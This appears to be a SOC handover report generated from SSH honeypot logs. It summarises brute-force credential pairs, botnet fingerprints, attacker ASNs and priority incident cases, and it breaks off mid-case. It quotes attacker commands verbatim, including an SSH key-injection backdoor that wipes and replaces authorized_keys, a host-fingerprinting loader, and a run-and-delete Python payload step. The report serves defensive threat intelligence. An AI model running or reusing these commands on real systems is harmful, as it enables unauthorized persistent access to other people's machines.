# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-05 |
| **Generated At** | 2026-07-05T21:07:42Z |
| **Shift Time** | 21:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **425** |
| Confirmed Threats | **416** |
| False Positives Filtered | **9** (2.1%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **14** |
| High Severity Cases | **81** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **344** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **129** |
| Unique Credential Pairs | **71** |
| Unique Usernames | **18** |
| Unique Passwords | **61** |
| Successful Auth Pairs | **87** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 56 |
| `support` | 20 |
| `345gs5662d34` | 19 |
| `admin` | 6 |
| `pi` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 20 |
| `345gs5662d34` | 19 |
| `3245gs5662d34` | 17 |
| `LeitboGi0ro` | 5 |
| `smo@@kkklss` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 20 |
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `3245gs5662d34` | 7 |
| `root` | `LeitboGi0ro` | 5 |
| `root` | `smo@@kkklss` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `gmp` | `gmp` | `10.0.0.73` | 2026-07-05T18:55:50 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-05T18:55:52 |
| `gmp` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T18:55:53 |
| `test2` | `2` | `10.0.0.73` | 2026-07-05T18:57:12 |
| `test2` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T18:57:14 |
| `root` | `admin!234` | `10.0.0.73` | 2026-07-05T18:57:15 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T18:57:18 |
| `support` | `support` | `176.53.159.196` | 2026-07-05T19:01:38 |
| `support` | `support` | `10.0.0.73` | 2026-07-05T19:01:53 |
| `root` | `1988` | `45.198.224.120` | 2026-07-05T19:03:19 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-05T19:08:57 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-05T19:08:57 |
| `postgres` | `qwer123` | `45.198.224.120` | 2026-07-05T19:14:40 |
| `ut2k4server` | `ut2k4server` | `120.48.17.184` | 2026-07-05T19:15:07 |
| `345gs5662d34` | `345gs5662d34` | `120.48.17.184` | 2026-07-05T19:15:11 |
| `ut2k4server` | `3245gs5662d34` | `120.48.17.184` | 2026-07-05T19:15:13 |
| `root` | `﻿------fuck------` | `61.178.209.47` | 2026-07-05T19:25:05 |
| `pi` | `raspberry` | `178.201.162.195` | 2026-07-05T19:25:16 |
| `pi` | `raspberryraspberry993311` | `178.201.162.195` | 2026-07-05T19:25:17 |
| `ubuntu` | `changeme123` | `45.198.224.120` | 2026-07-05T19:25:46 |
| `admin` | `Password1!` | `165.22.225.218` | 2026-07-05T19:26:25 |
| `345gs5662d34` | `345gs5662d34` | `165.22.225.218` | 2026-07-05T19:26:27 |
| `admin` | `3245gs5662d34` | `165.22.225.218` | 2026-07-05T19:26:27 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-05T19:30:04 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-05T19:30:04 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-05T19:30:06 |
| `ubuntu` | `asd123456789` | `185.242.3.195` | 2026-07-05T19:30:53 |
| `root` | `QWERT!@#$%` | `45.198.224.120` | 2026-07-05T19:37:07 |
| `oracle` | `123456a@` | `102.88.137.213` | 2026-07-05T19:37:45 |
| `345gs5662d34` | `345gs5662d34` | `102.88.137.213` | 2026-07-05T19:37:49 |
| `oracle` | `3245gs5662d34` | `102.88.137.213` | 2026-07-05T19:37:50 |
| `root` | `P@SSW0rd` | `61.76.38.54` | 2026-07-05T19:40:38 |
| `345gs5662d34` | `345gs5662d34` | `61.76.38.54` | 2026-07-05T19:40:42 |
| `root` | `3245gs5662d34` | `61.76.38.54` | 2026-07-05T19:40:43 |
| `root` | `charles1` | `54.38.52.18` | 2026-07-05T19:41:37 |
| `345gs5662d34` | `345gs5662d34` | `54.38.52.18` | 2026-07-05T19:41:40 |
| `root` | `3245gs5662d34` | `54.38.52.18` | 2026-07-05T19:41:41 |
| `root` | `ivan123` | `81.28.167.30` | 2026-07-05T19:43:58 |
| `345gs5662d34` | `345gs5662d34` | `81.28.167.30` | 2026-07-05T19:44:01 |
| `root` | `qwerty01` | `45.198.224.120` | 2026-07-05T19:48:16 |
| `server` | `abc123` | `10.0.0.73` | 2026-07-05T19:49:29 |
| `server` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T19:49:36 |
| `root` | `Gr123456` | `14.103.117.173` | 2026-07-05T19:51:58 |
| `root` | `zxcvbnm1` | `10.0.0.73` | 2026-07-05T19:52:36 |
| `root` | `Ab123456` | `10.0.0.73` | 2026-07-05T19:53:13 |
| `deploy` | `qwe123` | `10.0.0.73` | 2026-07-05T19:56:59 |
| `deploy` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T19:57:04 |
| `root` | `adminpw` | `10.0.0.73` | 2026-07-05T19:58:28 |
| `root` | `qwertyuiop` | `45.198.224.120` | 2026-07-05T19:59:28 |
| `root` | `admin` | `185.220.101.43` | 2026-07-05T20:01:44 |
| `liangwj` | `liangwj` | `45.198.224.120` | 2026-07-05T20:10:31 |
| `ubuntu` | `asd123456789` | `10.0.0.73` | 2026-07-05T20:11:23 |
| `ansible` | `apache` | `103.165.139.145` | 2026-07-05T20:12:28 |
| `345gs5662d34` | `345gs5662d34` | `103.165.139.145` | 2026-07-05T20:12:32 |
| `ansible` | `3245gs5662d34` | `103.165.139.145` | 2026-07-05T20:12:34 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-05T20:18:17 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-05T20:18:17 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-05T20:18:27 |
| `root` | `qweasdqwe` | `45.198.224.120` | 2026-07-05T20:21:41 |
| `root` | `111111` | `91.92.40.10` | 2026-07-05T20:24:45 |
| `root` | `123` | `91.92.40.10` | 2026-07-05T20:26:27 |
| `admin` | `admin` | `89.23.113.208` | 2026-07-05T20:28:14 |
| `root` | `123123` | `91.92.40.10` | 2026-07-05T20:28:15 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-05T20:28:15 |
| `root` | `123321` | `91.92.40.10` | 2026-07-05T20:29:57 |
| `root` | `1234` | `91.92.40.10` | 2026-07-05T20:31:38 |
| `guest` | `147258` | `45.198.224.120` | 2026-07-05T20:32:43 |
| `root` | `12345` | `91.92.40.10` | 2026-07-05T20:33:19 |
| `root` | `1234567` | `91.92.40.10` | 2026-07-05T20:36:24 |
| `admin` | `admin2024` | `10.0.0.73` | 2026-07-05T20:36:27 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T20:36:33 |
| `root` | `12345678` | `91.92.40.10` | 2026-07-05T20:37:56 |
| `root` | `123456789` | `91.92.40.10` | 2026-07-05T20:39:27 |
| `root` | `1234abcd` | `91.92.40.10` | 2026-07-05T20:41:02 |
| `root` | `123abc` | `91.92.40.10` | 2026-07-05T20:42:36 |
| `vendas` | `vendas` | `45.198.224.120` | 2026-07-05T20:43:57 |
| `root` | `123qwe` | `91.92.40.10` | 2026-07-05T20:44:10 |
| `root` | `1q2w3e` | `91.92.40.10` | 2026-07-05T20:45:48 |
| `root` | `1q2w3e4r` | `91.92.40.10` | 2026-07-05T20:47:24 |
| `root` | `1qaz2wsx` | `91.92.40.10` | 2026-07-05T20:49:02 |
| `root` | `admin12345.` | `10.0.0.73` | 2026-07-05T20:49:30 |
| `gitlab-runner` | `1` | `10.0.0.73` | 2026-07-05T20:49:33 |
| `gitlab-runner` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T20:49:39 |
| `root` | `qaqazzz` | `10.0.0.73` | 2026-07-05T20:50:32 |
| `root` | `654321` | `91.92.40.10` | 2026-07-05T20:50:36 |
| `root` | `P@ssw0rd` | `91.92.40.10` | 2026-07-05T20:52:08 |
| `root` | `P@ssword` | `91.92.40.10` | 2026-07-05T20:53:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **425** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 43 |
| libssh | 30 |
| Paramiko (Python) | 12 |
| OpenSSH | 5 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 21 | 9 |
| `2ec37a7cc8da...` | Mirai/variant | 19 | 1 |
| `16443846184e...` | Generic scanner | 12 | 2 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `eff4c24daffc...` | Modern SSH client | 10 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 21 | 9 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 19 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 12 | 2 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 10 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `ec7378c1a92f...` | OpenSSH | 4 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 18 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.10`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.17.184`, `102.88.137.213`, `103.165.139.145`, `61.76.38.54`, `54.38.52.18`, `165.22.225.218`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **29** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | LOW |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | MEDIUM |
| `AS3209` | Vodafone GmbH | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (81)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1a618c3c07c5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 19:01 |
| **Last Seen** | 2026-07-05 19:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:01:37` | `cowrie.session.connect` |
| `2026-07-05 19:01:37` | `cowrie.client.version` |
| `2026-07-05 19:01:37` | `cowrie.client.kex` |
| `2026-07-05 19:01:38` | `cowrie.login.success` |
| `2026-07-05 19:01:38` | `cowrie.direct-tcpip.request` |
| `2026-07-05 19:01:38` | `cowrie.direct-tcpip.data` |
| `2026-07-05 19:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a475162ce0e2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 19:03 |
| **Last Seen** | 2026-07-05 19:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:03:12` | `cowrie.session.connect` |
| `2026-07-05 19:03:13` | `cowrie.client.version` |
| `2026-07-05 19:03:13` | `cowrie.client.kex` |
| `2026-07-05 19:03:19` | `cowrie.login.success` |
| `2026-07-05 19:03:23` | `cowrie.session.params` |
| `2026-07-05 19:03:23` | `cowrie.command.input` |
| `2026-07-05 19:03:25` | `cowrie.log.closed` |
| `2026-07-05 19:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea567f910c37

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-05 19:08 |
| **Last Seen** | 2026-07-05 19:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:08:56` | `cowrie.session.connect` |
| `2026-07-05 19:08:56` | `cowrie.client.version` |
| `2026-07-05 19:08:56` | `cowrie.client.kex` |
| `2026-07-05 19:08:57` | `cowrie.login.success` |
| `2026-07-05 19:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f18269c891

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-05 19:08 |
| **Last Seen** | 2026-07-05 19:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:08:57` | `cowrie.session.connect` |
| `2026-07-05 19:08:57` | `cowrie.client.version` |
| `2026-07-05 19:08:57` | `cowrie.client.kex` |
| `2026-07-05 19:08:57` | `cowrie.login.success` |
| `2026-07-05 19:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55ca3a5e94de

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-05 19:09 |
| **Last Seen** | 2026-07-05 19:11 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:09:20` | `cowrie.session.connect` |
| `2026-07-05 19:09:20` | `cowrie.client.version` |
| `2026-07-05 19:09:20` | `cowrie.client.kex` |
| `2026-07-05 19:09:20` | `cowrie.login.success` |
| `2026-07-05 19:09:21` | `cowrie.session.file_upload` |
| `2026-07-05 19:09:22` | `cowrie.session.params` |
| `2026-07-05 19:09:22` | `cowrie.command.input` |
| `2026-07-05 19:09:22` | `cowrie.command.input` |
| `2026-07-05 19:09:22` | `cowrie.command.input` |
| `2026-07-05 19:09:22` | `cowrie.command.failed` |
| `2026-07-05 19:09:22` | `cowrie.log.closed` |
| `2026-07-05 19:09:23` | `cowrie.session.params` |
| `2026-07-05 19:09:23` | `cowrie.command.input` |
| `2026-07-05 19:09:23` | `cowrie.log.closed` |
| `2026-07-05 19:09:23` | `cowrie.session.params` |
| `2026-07-05 19:09:23` | `cowrie.command.input` |
| `2026-07-05 19:09:24` | `cowrie.log.closed` |
| `2026-07-05 19:09:24` | `cowrie.session.params` |
| `2026-07-05 19:09:24` | `cowrie.command.input` |
| `2026-07-05 19:09:24` | `cowrie.command.failed` |
| `2026-07-05 19:09:24` | `cowrie.command.failed` |
| `2026-07-05 19:10:25` | `cowrie.session.params` |
| `2026-07-05 19:10:25` | `cowrie.command.input` |
| `2026-07-05 19:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-622115f15363

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-05 19:11 |
| **Last Seen** | 2026-07-05 19:13 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:11:41` | `cowrie.session.connect` |
| `2026-07-05 19:11:41` | `cowrie.client.version` |
| `2026-07-05 19:11:41` | `cowrie.client.kex` |
| `2026-07-05 19:11:41` | `cowrie.login.success` |
| `2026-07-05 19:11:42` | `cowrie.session.file_upload` |
| `2026-07-05 19:11:43` | `cowrie.session.params` |
| `2026-07-05 19:11:43` | `cowrie.command.input` |
| `2026-07-05 19:11:43` | `cowrie.command.input` |
| `2026-07-05 19:11:43` | `cowrie.command.input` |
| `2026-07-05 19:11:43` | `cowrie.command.failed` |
| `2026-07-05 19:11:43` | `cowrie.log.closed` |
| `2026-07-05 19:11:44` | `cowrie.session.params` |
| `2026-07-05 19:11:44` | `cowrie.command.input` |
| `2026-07-05 19:11:44` | `cowrie.log.closed` |
| `2026-07-05 19:11:45` | `cowrie.session.params` |
| `2026-07-05 19:11:45` | `cowrie.command.input` |
| `2026-07-05 19:11:45` | `cowrie.log.closed` |
| `2026-07-05 19:11:45` | `cowrie.session.params` |
| `2026-07-05 19:11:45` | `cowrie.command.input` |
| `2026-07-05 19:11:45` | `cowrie.command.failed` |
| `2026-07-05 19:11:45` | `cowrie.command.failed` |
| `2026-07-05 19:12:46` | `cowrie.session.params` |
| `2026-07-05 19:12:46` | `cowrie.command.input` |
| `2026-07-05 19:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc189a521971

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 19:14 |
| **Last Seen** | 2026-07-05 19:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:14:33` | `cowrie.session.connect` |
| `2026-07-05 19:14:34` | `cowrie.client.version` |
| `2026-07-05 19:14:34` | `cowrie.client.kex` |
| `2026-07-05 19:14:40` | `cowrie.login.success` |
| `2026-07-05 19:14:44` | `cowrie.session.params` |
| `2026-07-05 19:14:44` | `cowrie.command.input` |
| `2026-07-05 19:14:46` | `cowrie.log.closed` |
| `2026-07-05 19:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b38f2f41207a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.17[.]184` |
| **First Seen** | 2026-07-05 19:15 |
| **Last Seen** | 2026-07-05 19:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:15:06` | `cowrie.session.connect` |
| `2026-07-05 19:15:06` | `cowrie.client.version` |
| `2026-07-05 19:15:06` | `cowrie.client.kex` |
| `2026-07-05 19:15:07` | `cowrie.login.success` |
| `2026-07-05 19:15:08` | `cowrie.session.params` |
| `2026-07-05 19:15:08` | `cowrie.command.input` |
| `2026-07-05 19:15:08` | `cowrie.command.failed` |
| `2026-07-05 19:15:09` | `cowrie.log.closed` |
| `2026-07-05 19:15:10` | `cowrie.session.params` |
| `2026-07-05 19:15:10` | `cowrie.command.input` |
| `2026-07-05 19:15:10` | `cowrie.session.file_download` |
| `2026-07-05 19:15:10` | `cowrie.log.closed` |
| `2026-07-05 19:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.17[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.48.17[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1eeae1da555

| Field | Detail |
|---|---|
| **Source IP** | `120.48.17[.]184` |
| **First Seen** | 2026-07-05 19:15 |
| **Last Seen** | 2026-07-05 19:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:15:10` | `cowrie.session.connect` |
| `2026-07-05 19:15:10` | `cowrie.client.version` |
| `2026-07-05 19:15:10` | `cowrie.client.kex` |
| `2026-07-05 19:15:11` | `cowrie.login.success` |
| `2026-07-05 19:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.17[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.48.17[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a39b64fc506c

| Field | Detail |
|---|---|
| **Source IP** | `120.48.17[.]184` |
| **First Seen** | 2026-07-05 19:15 |
| **Last Seen** | 2026-07-05 19:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:15:12` | `cowrie.session.connect` |
| `2026-07-05 19:15:12` | `cowrie.client.version` |
| `2026-07-05 19:15:12` | `cowrie.client.kex` |
| `2026-07-05 19:15:13` | `cowrie.login.success` |
| `2026-07-05 19:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.17[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.48.17[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b00d5b5970

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 19:23 |
| **Last Seen** | 2026-07-05 19:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:23:11` | `cowrie.session.connect` |
| `2026-07-05 19:23:11` | `cowrie.client.version` |
| `2026-07-05 19:23:11` | `cowrie.client.kex` |
| `2026-07-05 19:23:12` | `cowrie.login.success` |
| `2026-07-05 19:23:12` | `cowrie.direct-tcpip.request` |
| `2026-07-05 19:23:12` | `cowrie.direct-tcpip.data` |
| `2026-07-05 19:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a8667387a50

| Field | Detail |
|---|---|
| **Source IP** | `61.178.209[.]47` |
| **First Seen** | 2026-07-05 19:24 |
| **Last Seen** | 2026-07-05 19:30 |
| **Session Duration** | 307s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:24:57` | `cowrie.session.connect` |
| `2026-07-05 19:24:59` | `cowrie.client.version` |
